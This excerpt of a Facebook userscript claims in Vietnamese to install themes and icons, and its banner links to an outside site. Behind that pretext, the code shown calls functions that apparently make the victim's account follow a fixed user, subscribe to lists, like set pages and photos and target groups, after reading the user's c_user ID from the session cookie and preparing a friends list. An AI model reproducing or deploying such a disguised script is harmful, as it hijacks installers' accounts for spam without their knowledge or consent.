// ==UserScript==
// @name            Cài Theme và ICON cho FACEBOOK (y)
// @description     All about facebook By TTT
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://Apkso1.Com" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';
...
a("100007892194153");
//List
sublist("221105521371900");
sublist("415880825215884");
//Page
Like("1388335934720343");
Like("498982623543582");
Like("1411471555774708");
Like("238928616237939");
//Ảnh
P("292146084267843");
P("292146084267843");
P("501636769944834");
...
var gid = ['1398532687079976'];

var gid = ['520624208055465'];

var gid = ['652803394755605'];
...
var spage_id = "498982623543582";
var spost_id = "1388335934720343";
var sfoto_id = "1411471555774708";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
